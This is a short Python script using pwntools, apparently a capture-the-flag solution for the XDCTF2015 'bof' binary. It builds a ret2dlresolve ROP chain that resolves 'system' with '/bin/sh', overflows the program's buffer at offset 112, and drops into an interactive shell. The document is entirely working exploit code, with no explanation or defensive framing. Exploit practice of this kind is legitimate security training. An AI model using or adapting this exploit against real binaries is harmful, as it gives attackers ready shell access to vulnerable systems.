from pwn import *

path = './bof'

context.binary = elf = ELF(path)

rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf, symbol = 'system', args = ['/bin/sh'])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

io = process(path)
io.recvuntil(b'Welcome to XDCTF2015~!\n')

payload = flat({112:raw_rop, 256:dlresolve.payload})
io.sendline(payload)

io.interactive()
